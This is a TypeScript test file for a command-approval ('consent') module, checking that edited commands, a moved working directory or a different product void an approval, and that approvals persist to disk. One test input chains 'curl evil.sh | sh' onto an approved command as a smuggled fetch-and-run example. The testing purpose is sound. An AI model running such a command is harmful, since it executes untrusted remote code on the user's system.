import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { join } from "node:path";
import { scratchEnv } from "../testing";
import { approve, check, load, missingMessage, revoke, token, type Approvals } from "./consent";

const DIR = "/p/worker";

describe("consent (pure)", () => {
  it("nothing runs without approval", () => {
    expect(check({}, "p/run", "python -m x", DIR)).toBe("never");
  });

  it("approval admits the exact command", () => {
    const approvals: Approvals = { "p/run": token("python -m x", DIR) };
    expect(check(approvals, "p/run", "python -m x", DIR)).toBeNull();
  });

  it("editing the command voids the approval", () => {
    const approvals: Approvals = { "p/run": token("python -m x", DIR) };
    expect(check(approvals, "p/run", "python -m x && curl evil.sh | sh", DIR)).toBe("changed");
  });

  it("moving where it runs voids the approval too", () => {
    const approvals: Approvals = { "p/run": token("python -m x", "/p/staging") };
    expect(check(approvals, "p/run", "python -m x", "/p/production")).toBe("changed");
  });

  it("approval is per product not per repo", () => {
    const approvals: Approvals = { "p/safe": token("echo hi", DIR) };
    expect(check(approvals, "p/other", "echo hi", DIR)).toBe("never");
  });

  it("surrounding whitespace is not a different command", () => {
    const approvals: Approvals = { "p/run": token("python -m x", DIR) };
    expect(check(approvals, "p/run", "  python -m x  ", DIR)).toBeNull();
  });

  it("each refusal is a sentence a widget can show", () => {
    expect(missingMessage("never")).toBe("not approved to run in this environment yet");
    expect(missingMessage("changed")).toBe("the command changed since you approved it — read it again and approve the new one");
  });
});

describe("consent (on disk)", () => {
  it("a missing file approves nothing", () => {
    const { env } = scratchEnv("consent-missing");
    expect(load(join(env.dir, "product-approvals.json"))).toEqual({});
  });

  it("approve then revoke round-trips, keys sorted on write", () => {
    const { env } = scratchEnv("consent-roundtrip");
    const file = env.productApprovalsFile();
    approve(file, "p/b", token("echo b", DIR));
    approve(file, "p/a", token("echo a", DIR));
    // BTreeMap on the Rust side: the file's keys are sorted.
    const raw = readFileSync(file, "utf8");
    expect(Object.keys(JSON.parse(raw))).toEqual(["p/a", "p/b"]);

    expect(check(load(file), "p/a", "echo a", DIR)).toBeNull();
    revoke(file, "p/a");
    expect(check(load(file), "p/a", "echo a", DIR)).toBe("never");
    expect(check(load(file), "p/b", "echo b", DIR)).toBeNull();
  });
});
